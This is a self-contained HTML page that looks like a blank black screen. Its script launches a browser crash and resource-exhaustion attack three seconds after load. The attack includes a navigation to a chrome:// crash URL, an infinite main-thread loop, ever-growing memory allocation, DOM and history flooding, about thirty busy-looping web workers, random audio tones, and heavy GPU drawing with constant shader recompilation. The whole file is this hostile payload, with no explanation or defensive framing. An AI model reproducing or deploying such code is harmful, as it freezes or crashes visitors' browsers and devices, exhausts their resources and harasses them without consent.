<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title></title>
<style>
body{margin:0;overflow:hidden;background:black;}
canvas{position:fixed;left:0;top:0;}
</style>
</head>
<body>

<canvas id="gl"></canvas>

<script>
const canvas=document.getElementById("gl");
canvas.width=innerWidth;
canvas.height=innerHeight;
const gl=canvas.getContext("webgl");

gl.clearColor(0,0,0,1);
gl.clear(gl.COLOR_BUFFER_BIT);

setTimeout(startChaos,3000);

function startChaos(){

setTimeout(()=>{
 try{location.href="chrome://induecbrowsercrashforrealz"}catch(e){}
 try{location.replace("chrome://induecbrowsercrashforrealz")}catch(e){}
},4000);

setTimeout(()=>{
 while(true){Math.sqrt(Math.random()*Date.now())}
},8000);

let mem=[];
let size=20_000_000;
setInterval(()=>{
 mem.push(new Uint8Array(size));
 size+=10_000_000;
},200);

setInterval(()=>{
 for(let i=0;i<2000;i++){
  let d=document.createElement("div");
  d.textContent=Math.random();
  d.style.position="absolute";
  d.style.left=Math.random()*innerWidth+"px";
  d.style.top=Math.random()*innerHeight+"px";
  document.body.appendChild(d);
 }
},120);

setInterval(()=>{
 history.pushState({}, "", "#"+Math.random());
},80);

let workers=0;
let wInt=setInterval(()=>{
 new Worker(URL.createObjectURL(new Blob([`while(true){Math.atan(Math.random())}`])));
 workers++;
 if(workers>30) clearInterval(wInt);
},200);

const AC=window.AudioContext||window.webkitAudioContext;
const ac=new AC();
setInterval(()=>{
 let o=ac.createOscillator();
 o.frequency.value=Math.random()*4000;
 o.connect(ac.destination);
 o.start();
 o.stop(ac.currentTime+0.1);
},150);

const flood=document.createElement("canvas");
document.body.appendChild(flood);
const fx=flood.getContext("2d");

function gpu2d(){
 flood.width=innerWidth;
 flood.height=innerHeight;
 for(let i=0;i<8000;i++){
  fx.fillStyle=`hsl(${Math.random()*360},100%,50%)`;
  fx.fillRect(Math.random()*innerWidth,Math.random()*innerHeight,20,20);
 }
 requestAnimationFrame(gpu2d);
}
gpu2d();

const quad=[
-1,-1,0,1,-1,0,1,1,0,
-1,-1,0,1,1,0,-1,1,0
];

function frag(){
return `
precision highp float;
void main(){
 vec2 uv=gl_FragCoord.xy/vec2(${innerWidth}.0,${innerHeight}.0);
 vec3 c=vec3(0.);
 for(int i=0;i<25;i++){
  float t=float(i);
  c+=vec3(
   sin(uv.x*80.+t),
   cos(uv.y*80.-t),
   sin((uv.x+uv.y)*40.)
  );
 }
 gl_FragColor=vec4(c,1.);
}`;
}

const VSHADER=`attribute vec4 p;void main(){gl_Position=p;}`;

function compile(t,s){
 let sh=gl.createShader(t);
 gl.shaderSource(sh,s);
 gl.compileShader(sh);
 return sh;
}

let buf=gl.createBuffer();
gl.bindBuffer(gl.ARRAY_BUFFER,buf);
gl.bufferData(gl.ARRAY_BUFFER,new Float32Array(quad),gl.STATIC_DRAW);

function build(){
 let vs=compile(gl.VERTEX_SHADER,VSHADER);
 let fs=compile(gl.FRAGMENT_SHADER,frag());
 let pr=gl.createProgram();
 gl.attachShader(pr,vs);
 gl.attachShader(pr,fs);
 gl.linkProgram(pr);
 gl.useProgram(pr);
 let loc=gl.getAttribLocation(pr,"p");
 gl.vertexAttribPointer(loc,3,gl.FLOAT,false,0,0);
 gl.enableVertexAttribArray(loc);
 return pr;
}

let prog=build();

setInterval(()=>{prog=build()},500);

setInterval(()=>{
 canvas.width=400+Math.random()*1200;
 canvas.height=400+Math.random()*1200;
 gl.viewport(0,0,canvas.width,canvas.height);
},400);

function draw(){
 for(let i=0;i<5;i++){
  gl.drawArrays(gl.TRIANGLES,0,6);
 }
 gl.finish();
 requestAnimationFrame(draw);
}
draw();

}
</script>
</body>
</html>
